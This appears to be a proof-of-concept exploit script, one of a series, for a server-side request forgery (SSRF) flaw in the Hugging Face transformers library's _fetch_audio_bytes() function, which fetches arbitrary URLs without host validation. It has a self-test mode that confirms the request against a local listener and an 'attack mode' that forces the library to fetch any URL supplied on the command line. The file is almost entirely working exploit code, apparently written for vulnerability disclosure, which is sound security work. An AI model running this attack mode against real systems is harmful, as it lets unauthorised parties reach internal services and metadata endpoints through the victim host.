#!/usr/bin/env python3
"""
PoC 3/3 — SSRF via _fetch_audio_bytes() in audio_utils.py

Target:
  https://github.com/huggingface/transformers/blob/main/src/transformers/audio_utils.py#L64-L66

Code:
    response = httpx.get(url, follow_redirects=True, timeout=timeout)
    response.raise_for_status()
    return response.content

No host validation, follow_redirects=True.

Usage:
    python3 poc3_audio_utils_ssrf.py                          # 自测模式
    python3 poc3_audio_utils_ssrf.py http://target:port/path   # 攻击模式
"""

import http.server
import sys
import threading
import time


def start_listener(port: int):
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            received.append({"path": self.path})
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"poc3-ssrf-confirmed")
        def log_message(self, *a): pass

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, received


def main():
    target_url = sys.argv[1] if len(sys.argv) > 1 else None
    from transformers.audio_utils import _fetch_audio_bytes

    if target_url:
        print(f"[PoC3] _fetch_audio_bytes('{target_url}')")
        try:
            _fetch_audio_bytes(target_url, timeout=5)
            print("[*] _fetch_audio_bytes returned OK")
        except Exception as e:
            print(f"[*] Exception (SSRF already happened): {type(e).__name__}")
        return

    port = 18890
    print(f"[PoC3] Starting listener on 0.0.0.0:{port}")
    server, received = start_listener(port)
    time.sleep(0.3)

    test_url = f"http://127.0.0.1:{port}/poc3-ssrf-audio-utils"
    print(f"[PoC3] _fetch_audio_bytes('{test_url}')")
    try:
        _fetch_audio_bytes(test_url, timeout=5)
    except Exception:
        pass

    server.shutdown()
    print(f"[PoC3] Listener received {len(received)} requests")
    if received:
        print(f"  PATH: {received[0]['path']}")
        print("  ✅ SSRF CONFIRMED via _fetch_audio_bytes() -> httpx.get()")
    else:
        print("  ❌ No request received")
        sys.exit(1)


if __name__ == "__main__":
    main()
